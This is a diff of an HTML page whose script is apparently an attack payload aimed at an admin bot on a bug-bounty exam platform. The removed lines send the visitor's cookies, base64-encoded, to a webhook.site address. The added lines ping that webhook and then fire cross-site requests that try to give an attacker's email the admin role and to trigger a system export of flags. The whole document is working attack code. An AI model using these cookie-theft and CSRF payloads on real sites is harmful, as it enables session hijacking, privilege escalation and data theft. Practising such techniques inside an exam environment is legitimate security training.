@@ -2,12 +2,39 @@
 <html>
 <body>
     <script>
-        // No fetch, no waiting. Just a direct, aggressive redirect.
-        // We attach the cookies to the URL so they show up in your Webhook logs.
-        const webhook = "https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4";
+        // Notify webhook that the CSRF attempt is starting
+        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/CSRF_ATTEMPT');
+
+        // We will try to 'submit' a form as the admin bot to change YOUR user role
+        // Replace YOUR_USER_ID with your actual ID if you know it, 
+        // or we try a general endpoint.
         
-        // This line tries to grab the cookies and send the bot to your webhook instantly
-        window.location.href = webhook + "/?cookie=" + btoa(document.cookie) + "&origin=" + btoa(window.location.href);
+        async function runExploit() {
+            // Attempt 1: Try to change a user's role to admin
+            // This is a common pattern in HashAcademy exams
+            fetch('https://api-bugbounty-exam.hashacademy.co/api/admin/users/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    role: 'admin',
+                    email: 'rundlady@gongjua.com' // Use your account email
+                })
+            });
+
+            // Attempt 2: Try to trigger a 'System Export' 
+            // This might send a file to your email containing all flags
+            fetch('https://api-bugbounty-exam.hashacademy.co/api/admin/system/export', {
+                method: 'GET'
+            });
+
+            // After 2 seconds, send the bot back to the dashboard 
+            // to see if the action 'stuck'
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+            }, 2000);
+        }
+
+        runExploit();
     </script>
 </body>
 </html>
